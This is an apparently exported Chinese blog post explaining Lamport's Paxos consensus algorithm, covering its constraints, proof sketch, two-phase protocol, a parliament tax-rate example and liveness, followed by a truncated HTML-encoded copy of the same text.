Paxos算法\ncategories:\n  - 算法及理论\ntags:\n  - 分布式算法\ndate: 2016-11-7 22:41:19\n---\n\nPaxos算法是莱斯利·兰伯特（英语：Leslie Lamport，LaTeX中的“La”）于1990年提出的一种基于消息传递且具有高度容错特性的一致性算法。\n\n## 问题和假设\n**分布式系统中的节点通信存在两种模型：共享内存（Shared memory）和消息传递（Messages passing）**。基于消息传递通信模型的分布式系统，不可避免的会发生以下错误：进程可能会慢、被杀死或者重启，消息可能会延迟、丢失、重复，在基础Paxos场景中，先不考虑可能出现消息篡改即[拜占庭错误](https://zh.wikipedia.org/wiki/拜占庭将军问题)的情况。Paxos算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。**一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。**为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个“一致性算法”以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。因此从20世纪80年代起对于一致性算法的研究就没有停止过。\n\n<!-- more -->\n\n为描述Paxos算法，Lamport虚拟了一个叫做Paxos的希腊城邦，这个岛按照议会民主制的政治模式制订法律，但是没有人愿意将自己的全部时间和精力放在这种事情上。所以无论是议员，议长或者传递纸条的服务员都不能承诺别人需要时一定会出现，也无法承诺批准决议或者传递消息的时间。但是这里假设没有拜占庭将军问题（Byzantine failure，即虽然有可能一个消息被传递了两次，但是绝对不会出现错误的消息）；只要等待足够的时间，消息就会被传到。另外，Paxos岛上的议员是不会反对其他议员提出的决议的。\n\n对应于分布式系统，议员对应于各个节点，制定的法律对应于系统的状态。各个节点需要进入一个一致的状态，例如在独立Cache的对称多处理器系统中，各个处理器读内存的某个字节时，必须读到同样的一个值，否则系统就违背了一致性的要求。一致性要求对应于法律条文只能有一个版本。议员和服务员的不确定性对应于节点和消息传递通道的不可靠性。\n\n---\n\n## 算法\n### 算法的提出与证明\n首先将议员的角色分为proposers，acceptors，和learners（允许身兼数职）。proposers提出提案，提案信息包括提案编号和提议的value；acceptor收到提案后可以接受（accept）提案，若提案获得多数acceptors的接受，则称该提案被批准（chosen）；learners只能“学习”被批准的提案。划分角色后，就可以更精确的定义问题：\n- 决议（value）只有在被proposers提出后才能被批准（未经批准的决议称为“提案（proposal）”）；\n- 在一次Paxos算法的执行实例中，只批准（chosen）一个value；\n- learners只能获得被批准（chosen）的value。\n\n另外还需要保证progress。这一点以后再讨论。\n\n作者通过不断加强上述3个约束（主要是第二个）获得了Paxos算法。\n\n批准value的过程中，首先proposers将value发送给acceptors，之后acceptors对value进行接受（accept）。为了满足只批准一个value的约束，要求经“多数派（majority）”接受的value成为正式的决议（称为“批准”决议）。这是因为无论是按照人数还是按照权重划分，两组“多数派”至少有一个公共的acceptor，如果每个acceptor只能接受一个value，约束2就能保证。\n\n于是产生了一个显而易见的新约束：\n```bash\nP1：一个acceptor必须接受（accept）第一次收到的提案。\n```\n注意P1是不完备的。如果恰好一半acceptor接受的提案具有value A，另一半接受的提案具有value B，那么就无法形成多数派，无法批准任何一个value。\n\n约束2并不要求只批准一个提案，暗示可能存在多个提案。只要提案的value是一样的，批准多个提案不违背约束2。于是可以产生约束P2：\n```bash\nP2：一旦一个具有value v的提案被批准（chosen），那么之后批准（chosen）的提案必须具有value v。\n```\n> 注：通过某种方法可以为每个提案分配一个编号，在提案之间建立一个全序关系，所谓“之后”都是指所有编号更大的提案。\n\n如果P1和P2都能够保证，那么约束2就能够保证。\n\n批准一个value意味着多个acceptor接受（accept）了该value.因此，可以对P2进行加强：\n```bash\nP2a：一旦一个具有value v的提案被批准（chosen），那么之后任何acceptor再次接受（accept）的提案必须具有value v。\n```\n\n由于通信是异步的，P2a和P1会发生冲突。如果一个value被批准后，一个proposer和一个acceptor从休眠中苏醒，前者提出一个具有新的value的提案。根据P1，后者应当接受，根据P2a，则不应当接受，这中场景下P2a和P1有矛盾。于是需要换个思路，转而对proposer的行为进行约束：\n```bash\nP2b：一旦一个具有value v的提案被批准（chosen），那么以后任何proposer提出的提案必须具有value v。\n```\n\n由于acceptor能接受的提案都必须由proposer提出，所以P2b蕴涵了P2a，是一个更强的约束。\n但是根据P2b难以提出实现手段。因此需要进一步加强P2b。\n\n假设一个编号为m的value v已经获得批准（chosen），来看看在什么情况下对任何编号为n（n>m）的提案都含有value v。因为m已经获得批准（chosen），显然存在一个acceptors的多数派C，他们都接受（accept）了v。考虑到任何多数派都和C具有至少一个公共成员，可以找到一个蕴涵P2b的约束P2c：\n```bash\nP2c：如果一个编号为n的提案具有value v，那么存在一个多数派，要么他们中所有人都没有接受（accept）编号小于n \n的任何提案，要么他们已经接受（accept）的所有编号小于n的提案中编号最大的那个提案具有value v。\n```\n\n**可以用数学归纳法证明P2c蕴涵P2b：**\n假设具有value v的提案m获得批准，当n=m+1时，采用反证法，假如提案n不具有value v，而是具有value w，根据P2c，则存在一个多数派S1，要么他们中没有人接受过编号小于n的任何提案，要么他们已经接受的所有编号小于n的提案中编号最大的那个提案是value w。由于S1和通过提案m时的多数派C之间至少有一个公共的acceptor，所以以上两个条件都不成立，导出矛盾从而推翻假设，证明了提案n必须具有value v；\n\n若（m+1）..（N-1）所有提案都具有value v，采用反证法，假如新提案N不具有value v，而是具有value w',根据P2c，则存在一个多数派S2，要么他们没有接受过m..（N-1）中的任何提案，要么他们已经接受的所有编号小于N的提案中编号最大的那个提案是value w'。由于S2和通过m的多数派C之间至少有一个公共的acceptor，所以至少有一个acceptor曾经接受了m，从而也可以推出S2中已接受的所有编号小于n的提案中编号最大的那个提案的编号范围在m..（N-1）之间，而根据初始假设，m..（N-1）之间的所有提案都具有value v，所以S2中已接受的所有编号小于n的提案中编号最大的那个提案肯定具有value v，导出矛盾从而推翻新提案n不具有value v的假设。根据数学归纳法，我们证明了若满足P2c，则P2b一定满足。\n\nP2c是可以通过消息传递模型实现的。另外，引入了P2c后，也解决了前文提到的P1不完备的问题。\n\n### 算法的内容\n要满足P2c的约束，proposer提出一个提案前，首先要和足以形成多数派的acceptors进行通信，获得他们进行的最近一次接受（accept）的提案（prepare过程），之后根据回收的信息决定这次提案的value，形成提案开始投票。当获得多数acceptors接受（accept）后，提案获得批准（chosen），由proposer将这个消息告知learner。这个简略的过程经过进一步细化后就形成了Paxos算法。\n\n在一个paxos实例中，每个提案需要有不同的编号，且编号间要存在全序关系。可以用多种方法实现这一点，例如将序数和proposer的名字拼接起来。如何做到这一点不在Paxos算法讨论的范围之内。\n\n如果一个没有chosen过任何proposer提案的acceptor在prepare过程中回答了一个proposer针对提案n的问题，但是在开始对n进行投票前，又接受（accept）了编号小于n的另一个提案（例如n-1），如果n-1和n具有不同的value，这个投票就会违背P2c。因此在prepare过程中，acceptor进行的回答同时也应包含承诺：不会再接受（accept）编号小于n的提案。这是对P1的加强：\n```bash\nP1a：当且仅当acceptor没有回应过编号大于n的prepare请求时，acceptor接受（accept）编号为n的提案。\n```\n现在已经可以提出完整的算法了。\n\n#### 决议的提出与批准\n通过一个决议分为两个阶段：\n- prepare阶段：\n\t- proposer选择一个提案编号n并将prepare请求发送给acceptors中的一个多数派；\n\t- acceptor收到prepare消息后，如果提案的编号大于它已经回复的所有prepare消息，则acceptor将自己上次接受的提案回复给proposer，并承诺不再回复小于n的提案；\n- 批准阶段：\n\t- 当一个proposer收到了多数acceptors对prepare的回复后，就进入批准阶段。它要向回复prepare请求的acceptors发送accept请求，包括编号n和根据P2c决定的value（如果根据P2c没有已经接受的value，那么它可以自由决定value）。\n\t- 在不违背自己向其他proposer的承诺的前提下，acceptor收到accept请求后即接受这个请求。\n\n这个过程在任何时候中断都可以保证正确性。例如如果一个proposer发现已经有其他proposers提出了编号更高的提案，则有必要中断这个过程。因此为了优化，在上述prepare过程中，如果一个acceptor发现存在一个更高编号的提案，则需要通知proposer，提醒其中断这次提案。\n\n#### 实例\n用实际的例子来更清晰地描述上述过程：\n有A1, A2, A3, A4, A5 5位议员，就税率问题进行决议。议员A1决定将税率定为10%,因此它向所有人发出一个草案。这个草案的内容是：\n```bash\n现有的税率是什么?如果没有决定，则建议将其定为10%.时间：本届议会第3年3月15日;提案者：A1\n```\n在最简单的情况下，没有人与其竞争;信息能及时顺利地传达到其它议员处。\n于是, A2-A5回应：\n```bash\n我已收到你的提案，等待最终批准\n```\n而A1在收到2份回复后就发布最终决议：\n```bash\n税率已定为10%,新的提案不得再讨论本问题。\n```\n这实际上退化为二阶段提交协议。\n现在我们假设在A1提出提案的同时, A5决定将税率定为20%:\n```bash\n现有的税率是什么?如果没有决定，则建议将其定为20%.时间：本届议会第3年3月15日;提案者：A5\n```\n草案要通过侍从送到其它议员的案头. A1的草案将由4位侍从送到A2-A5那里。现在，负责A2和A3的侍从将草案顺利送达，负责A4和A5的侍从则不上班. A5的草案则顺利的送至A3和A4手中。\n\n现在, A1, A2, A3收到了A1的提案; A3, A4, A5收到了A5的提案。按照协议, A1, A2, A4, A5将接受他们收到的提案，侍从将拿着\n```bash\n我已收到你的提案，等待最终批准\n```\n的回复回到提案者那里。\n而A3的行为将决定批准哪一个。\n\n##### 情况一\n假设A1的提案先送到A3处，而A5的侍从决定放假一段时间。于是A3接受并派出了侍从. A1等到了两位侍从，加上它自己已经构成一个多数派，于是税率10%将成为决议. A1派出侍从将决议送到所有议员处：\n```bash\n税率已定为10%,新的提案不得再讨论本问题。\n```\nA3在很久以后收到了来自A5的提案。由于税率问题已经讨论完毕，他决定不再理会。但是他要抱怨一句：\n```bash\n税率已在之前的投票中定为10%,你不要再来烦我!\n```\n这个回复对A5可能有帮助，因为A5可能因为某种原因很久无法与与外界联系了。当然更可能对A5没有任何作用，因为A5可能已经从A1处获得了刚才的决议。\n\n##### 情况二\n依然假设A1的提案先送到A3处，但是这次A5的侍从不是放假了，只是中途耽搁了一会。这次, A3依然会将\"接受\"回复给A1.但是在决议成型之前它又收到了A5的提案。这时协议有两种处理方式：\n1.如果A5的提案更早，按照传统应该由较早的提案者主持投票。现在看来两份提案的时间一样（本届议会第3年3月15日）。但是A5是个惹不起的大人物。于是A3回复：\n```bash\n我已收到您的提案，等待最终批准，但是您之前有人提出将税率定为10%,请明察。\n```\n于是, A1和A5都收到了足够的回复。这时关于税率问题就有两个提案在同时进行。但是A5知道之前有人提出税率为10%.于是A1和A5都会向全体议员广播：\n```bash\n税率已定为10%,新的提案不得再讨论本问题。\n```\n一致性得到了保证。\n\n2. A5是个无足轻重的小人物。这时A3不再理会他, A1不久后就会广播税率定为10%.\n\n##### 情况三\n在这个情况中，我们将看见，根据提案的时间及提案者的权势决定是否应答是有意义的。在这里，时间和提案者的权势就构成了给提案编号的依据。这样的编号符合\"任何两个提案之间构成偏序\"的要求。\n\nA1和A5同样提出上述提案，这时A1可以正常联系A2和A3; A5也可以正常联系这两个人。这次A2先收到A1的提案; A3则先收到A5的提案. A5更有权势。\n\n在这种情况下，已经回答A1的A2发现有比A1更有权势的A5提出了税率20%的新提案，于是回复A5说：\n```bash\n我已收到您的提案，等待最终批准。\n```\n而回复了A5的A3发现新的提案者A1是个小人物，不予理会。\n\nA1没有达到多数，A5达到了，于是A5将主持投票，决议的内容是A5提出的税率20%.\n\n如果A3决定平等地对待每一位议员，对A1做出\"你之前有人提出将税率定为20%\"的回复，则将造成混乱。这种情况下A1和A5都将试图主持投票，但是这次两份提案的内容不同。\n\n这种情况下, A3若对A1进行回复，只能说：\n```bash\n有更大的人物关注此事，请等待他做出决定。\n```\n\n另外，在这种情况下, A4与外界失去了联系。等到他恢复联系，并需要得知税率情况时，他（在最简单的协议中）将提出一个提案：\n```bash\n现有的税率是什么?如果没有决定，则建议将其定为15%.时间：本届议会第3年4月1日;提案者：A4\n```\n这时，（在最简单的协议中）其他议员将会回复：\n```bash\n税率已在之前的投票中定为20%,你不要再来烦我!\n```\n\n#### 决议的发布\n一个显而易见的方法是当acceptors批准一个value时，将这个消息发送给所有learner。但是这个方法会导致消息量过大。\n由于假设没有Byzantine failures，learners可以通过别的learners获取已经通过的决议。因此acceptors只需将批准的消息发送给指定的某一个learner，其他learners向它询问已经通过的决议。这个方法降低了消息量，但是指定learner失效将引起系统失效。\n\n因此acceptors需要将accept消息发送给learners的一个子集，然后由这些learners去通知所有learners。\n但是由于消息传递的不确定性，可能会没有任何learner获得了决议批准的消息。当learners需要了解决议通过情况时，可以让一个proposer重新进行一次提案。注意一个learner可能兼任proposer。\n\n#### Progress的保证\n根据上述过程当一个proposer发现存在编号更大的提案时将终止提案。这意味着提出一个编号更大的提案会终止之前的提案过程。如果两个proposer在这种情况下都转而提出一个编号更大的提案，就可能陷入活锁，违背了Progress的要求。这种情况下的解决方案是选举出一个leader，仅允许leader提出提案。但是由于消息传递的不确定性，可能有多个proposer自认为自己已经成为leader。Lamport在The Part-Time Parliament一文中描述并解决了这个问题。\n","slug":"Paxos算法","published":1,"updated":"2016-11-17T11:59:42.669Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbx001zgwtm5nohdz3n","content":"<p>Paxos&#x7B97;&#x6CD5;&#x662F;&#x83B1;&#x65AF;&#x5229;&#xB7;&#x5170;&#x4F2F;&#x7279;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Leslie Lamport&#xFF0C;LaTeX&#x4E2D;&#x7684;&#x201C;La&#x201D;&#xFF09;&#x4E8E;1990&#x5E74;&#x63D0;&#x51FA;&#x7684;&#x4E00;&#x79CD;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x4E14;&#x5177;&#x6709;&#x9AD8;&#x5EA6;&#x5BB9;&#x9519;&#x7279;&#x6027;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x3002;</p>\n<h2 id=\"&#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;\"><a href=\"#&#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;\" class=\"headerlink\" title=\"&#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;\"></a>&#x95EE;&#x9898;&#x548C;&#x5047;&#x8BBE;</h2><p><strong>&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x8282;&#x70B9;&#x901A;&#x4FE1;&#x5B58;&#x5728;&#x4E24;&#x79CD;&#x6A21;&#x578B;&#xFF1A;&#x5171;&#x4EAB;&#x5185;&#x5B58;&#xFF08;Shared memory&#xFF09;&#x548C;&#x6D88;&#x606F;&#x4F20;&#x9012;&#xFF08;Messages passing&#xFF09;</strong>&#x3002;&#x57FA;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x901A;&#x4FE1;&#x6A21;&#x578B;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x4F1A;&#x53D1;&#x751F;&#x4EE5;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;&#x8FDB;&#x7A0B;&#x53EF;&#x80FD;&#x4F1A;&#x6162;&#x3001;&#x88AB;&#x6740;&#x6B7B;&#x6216;&#x8005;&#x91CD;&#x542F;&#xFF0C;&#x6D88;&#x606F;&#x53EF;&#x80FD;&#x4F1A;&#x5EF6;&#x8FDF;&#x3001;&#x4E22;&#x5931;&#x3001;&#x91CD;&#x590D;&#xFF0C;&#x5728;&#x57FA;&#x7840;Paxos&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x5148;&#x4E0D;&#x8003;&#x8651;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x6D88;&#x606F;&#x7BE1;&#x6539;&#x5373;<a href=\"https://zh.wikipedia.org/wiki/&#x62DC;&#x5360;&#x5EAD;&#x5C06;&#x519B;&#x95EE;&#x9898;\" target=\"_blank\" rel=\"external\">&#x62DC;&#x5360;&#x5EAD;&#x9519;&#x8BEF;</a>&#x7684;&#x60C5;&#x51B5;&#x3002;Paxos&#x7B97;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x53EF;&#x80FD;&#x53D1;&#x751F;&#x4E0A;&#x8FF0;&#x5F02;&#x5E38;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x5982;&#x4F55;&#x5C31;&#x67D0;&#x4E2A;&#x503C;&#x8FBE;&#x6210;&#x4E00;&#x81F4;&#xFF0C;&#x4FDD;&#x8BC1;&#x4E0D;&#x8BBA;&#x53D1;&#x751F;&#x4EE5;&#x4E0A;&#x4EFB;&#x4F55;&#x5F02;&#x5E38;&#xFF0C;&#x90FD;&#x4E0D;&#x4F1A;&#x7834;&#x574F;&#x51B3;&#x8BAE;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;<strong>&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x573A;&#x666F;&#x662F;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x5404;&#x8282;&#x70B9;&#x7684;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x4E00;&#x81F4;&#xFF0C;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x90FD;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x64CD;&#x4F5C;&#x5E8F;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x4EEC;&#x6700;&#x540E;&#x80FD;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#x3002;</strong>&#x4E3A;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x6267;&#x884C;&#x76F8;&#x540C;&#x7684;&#x547D;&#x4EE4;&#x5E8F;&#x5217;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6BCF;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x4E0A;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x201C;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x201D;&#x4EE5;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x770B;&#x5230;&#x7684;&#x6307;&#x4EE4;&#x4E00;&#x81F4;&#x3002;&#x4E00;&#x4E2A;&#x901A;&#x7528;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x53EF;&#x4EE5;&#x5E94;&#x7528;&#x5728;&#x8BB8;&#x591A;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x4E2D;&#x7684;&#x91CD;&#x8981;&#x95EE;&#x9898;&#x3002;&#x56E0;&#x6B64;&#x4ECE;20&#x4E16;&#x7EAA;80&#x5E74;&#x4EE3;&#x8D77;&#x5BF9;&#x4E8E;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x7684;&#x7814;&#x7A76;&#x5C31;&#x6CA1;&#x6709;&#x505C;&#x6B62;&#x8FC7;&#x3002;</p>\n<a id=\"more\"></a>\n<p>&#x4E3A;&#x63CF;&#x8FF0;Paxos&#x7B97;&#x6CD5;&#xFF0C;Lamport&#x865A;&#x62DF;&#x4E86;&#x4E00;&#x4E2A;&#x53EB;&#x505A;Paxos&#x7684;&#x5E0C;&#x814A;&#x57CE;&#x90A6;&#xFF0C;&#x8FD9;&#x4E2A;&#x5C9B;&#x6309;&#x7167;&#x8BAE;&#x4F1A;&#x6C11;&#x4E3B;&#x5236;&#x7684;&#x653F;&#x6CBB;&#x6A21;&#x5F0F;&#x5236;&#x8BA2;&#x6CD5;&#x5F8B;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x4EBA;&#x613F;&#x610F;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x548C;&#x7CBE;&#x529B;&#x653E;&#x5728;&#x8FD9;&#x79CD;&#x4E8B;&#x60C5;&#x4E0A;&#x3002;&#x6240;&#x4EE5;&#x65E0;&#x8BBA;&#x662F;&#x8BAE;&#x5458;&#xFF0C;&#x8BAE;&#x957F;&#x6216;&#x8005;&#x4F20;&#x9012;&#x7EB8;&#x6761;&#x7684;&#x670D;&#x52A1;&#x5458;&#x90FD;&#x4E0D;&#x80FD;&#x627F;&#x8BFA;&#x522B;&#x4EBA;&#x9700;&#x8981;&#x65F6;&#x4E00;&#x5B9A;&#x4F1A;&#x51FA;&#x73B0;&#xFF0C;&#x4E5F;&#x65E0;&#x6CD5;&#x627F;&#x8BFA;&#x6279;&#x51C6;&#x51B3;&#x8BAE;&#x6216;&#x8005;&#x4F20;&#x9012;&#x6D88;&#x606F;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x5047;&#x8BBE;&#x6CA1;&#x6709;&#x62DC;&#x5360;&#x5EAD;&#x5C06;&#x519B;&#x95EE;&#x9898;&#xFF08;Byzantine failure&#xFF0C;&#x5373;&#x867D;&#x7136;&#x6709;&#x53EF;&#x80FD;&#x4E00;&#x4E2A;&#x6D88;&#x606F;&#x88AB;&#x4F20;&#x9012;&#x4E86;&#x4E24;&#x6B21;&#xFF0C;&#x4F46;&#x662F;&#x7EDD;&#x5BF9;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#x7684;&#x6D88;&#x606F;&#xFF09;&#xFF1B;&#x53EA;&#x8981;&#x7B49;&#x5F85;&#x8DB3;&#x591F;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6D88;&#x606F;&#x5C31;&#x4F1A;&#x88AB;&#x4F20;&#x5230;&#x3002;&#x53E6;&#x5916;&#xFF0C;Paxos&#x5C9B;&#x4E0A;&#x7684;&#x8BAE;&#x5458;&#x662F;&#x4E0D;&#x4F1A;&#x53CD;&#x5BF9;&#x5176;&#x4ED6;&#x8BAE;&#x5458;&#x63D0;&#x51FA;&#x7684;&#x51B3;&#x8BAE;&#x7684;&#x3002;</p>\n<p>&#x5BF9;&#x5E94;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#xFF0C;&#x8BAE;&#x5458;&#x5BF9;&#x5E94;&#x4E8E;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x5236;&#x5B9A;&#x7684;&#x6CD5;&#x5F8B;&#x5BF9;&#x5E94;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;&#x3002;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#x9700;&#x8981;&#x8FDB;&#x5165;&#x4E00;&#x4E2A;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x4F8B;&#x5982;&#x5728;&#x72EC;&#x7ACB;Cache&#x7684;&#x5BF9;&#x79F0;&#x591A;&#x5904;&#x7406;&#x5668;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5404;&#x4E2A;&#x5904;&#x7406;&#x5668;&#x8BFB;&#x5185;&#x5B58;&#x7684;&#x67D0;&#x4E2A;&#x5B57;&#x8282;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x8BFB;&#x5230;&#x540C;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x5426;&#x5219;&#x7CFB;&#x7EDF;&#x5C31;&#x8FDD;&#x80CC;&#x4E86;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x8981;&#x6C42;&#x3002;&#x4E00;&#x81F4;&#x6027;&#x8981;&#x6C42;&#x5BF9;&#x5E94;&#x4E8E;&#x6CD5;&#x5F8B;&#x6761;&#x6587;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#x3002;&#x8BAE;&#x5458;&#x548C;&#x670D;&#x52A1;&#x5458;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#x5BF9;&#x5E94;&#x4E8E;&#x8282;&#x70B9;&#x548C;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x901A;&#x9053;&#x7684;&#x4E0D;&#x53EF;&#x9760;&#x6027;&#x3002;</p>\n<hr>\n<h2 id=\"&#x7B97;&#x6CD5;\"><a href=\"#&#x7B97;&#x6CD5;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;\"></a>&#x7B97;&#x6CD5;</h2><h3 id=\"&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;\"><a href=\"#&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;\"></a>&#x7B97;&#x6CD5;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x8BC1;&#x660E;</h3><p>&#x9996;&#x5148;&#x5C06;&#x8BAE;&#x5458;&#x7684;&#x89D2;&#x8272;&#x5206;&#x4E3A;proposers&#xFF0C;acceptors&#xFF0C;&#x548C;learners&#xFF08;&#x5141;&#x8BB8;&#x8EAB;&#x517C;&#x6570;&#x804C;&#xFF09;&#x3002;proposers&#x63D0;&#x51FA;&#x63D0;&#x6848;&#xFF0C;&#x63D0;&#x6848;&#x4FE1;&#x606F;&#x5305;&#x62EC;&#x63D0;&#x6848;&#x7F16;&#x53F7;&#x548C;&#x63D0;&#x8BAE;&#x7684;value&#xFF1B;acceptor&#x6536;&#x5230;&#x63D0;&#x6848;&#x540E;&#x53EF;&#x4EE5;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x63D0;&#x6848;&#xFF0C;&#x82E5;&#x63D0;&#x6848;&#x83B7;&#x5F97;&#x591A;&#x6570;acceptors&#x7684;&#x63A5;&#x53D7;&#xFF0C;&#x5219;&#x79F0;&#x8BE5;&#x63D0;&#x6848;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF1B;learners&#x53EA;&#x80FD;&#x201C;&#x5B66;&#x4E60;&#x201D;&#x88AB;&#x6279;&#x51C6;&#x7684;&#x63D0;&#x6848;&#x3002;&#x5212;&#x5206;&#x89D2;&#x8272;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x66F4;&#x7CBE;&#x786E;&#x7684;&#x5B9A;&#x4E49;&#x95EE;&#x9898;&#xFF1A;</p>\n<ul>\n<li>&#x51B3;&#x8BAE;&#xFF08;value&#xFF09;&#x53EA;&#x6709;&#x5728;&#x88AB;proposers&#x63D0;&#x51FA;&#x540E;&#x624D;&#x80FD;&#x88AB;&#x6279;&#x51C6;&#xFF08;&#x672A;&#x7ECF;&#x6279;&#x51C6;&#x7684;&#x51B3;&#x8BAE;&#x79F0;&#x4E3A;&#x201C;&#x63D0;&#x6848;&#xFF08;proposal&#xFF09;&#x201D;&#xFF09;&#xFF1B;</li>\n<li>&#x5728;&#x4E00;&#x6B21;Paxos&#x7B97;&#x6CD5;&#x7684;&#x6267;&#x884C;&#x5B9E;&#x4F8B;&#x4E2D;&#xFF0C;&#x53EA;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x4E00;&#x4E2A;value&#xFF1B;</li>\n<li>learners&#x53EA;&#x80FD;&#x83B7;&#x5F97;&#x88AB;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#x7684;value&#x3002;</li>\n</ul>\n<p>&#x53E6;&#x5916;&#x8FD8;&#x9700;&#x8981;&#x4FDD;&#x8BC1;progress&#x3002;&#x8FD9;&#x4E00;&#x70B9;&#x4EE5;&#x540E;&#x518D;&#x8BA8;&#x8BBA;&#x3002;</p>\n<p>&#x4F5C;&#x8005;&#x901A;&#x8FC7;&#x4E0D;&#x65AD;&#x52A0;&#x5F3A;&#x4E0A;&#x8FF0;3&#x4E2A;&#x7EA6;&#x675F;&#xFF08;&#x4E3B;&#x8981;&#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#xFF09;&#x83B7;&#x5F97;&#x4E86;Paxos&#x7B97;&#x6CD5;&#x3002;</p>\n<p>&#x6279;&#x51C6;value&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9996;&#x5148;proposers&#x5C06;value&#x53D1;&#x9001;&#x7ED9;acceptors&#xFF0C;&#x4E4B;&#x540E;acceptors&#x5BF9;value&#x8FDB;&#x884C;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x3002;&#x4E3A;&#x4E86;&#x6EE1;&#x8DB3;&#x53EA;&#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x7684;&#x7EA6;&#x675F;&#xFF0C;&#x8981;&#x6C42;&#x7ECF;&#x201C;&#x591A;&#x6570;&#x6D3E;&#xFF08;majority&#xFF09;&#x201D;&#x63A5;&#x53D7;&#x7684;value&#x6210;&#x4E3A;&#x6B63;&#x5F0F;&#x7684;&#x51B3;&#x8BAE;&#xFF08;&#x79F0;&#x4E3A;&#x201C;&#x6279;&#x51C6;&#x201D;&#x51B3;&#x8BAE;&#xFF09;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x65E0;&#x8BBA;&#x662F;&#x6309;&#x7167;&#x4EBA;&#x6570;&#x8FD8;&#x662F;&#x6309;&#x7167;&#x6743;&#x91CD;&#x5212;&#x5206;&#xFF0C;&#x4E24;&#x7EC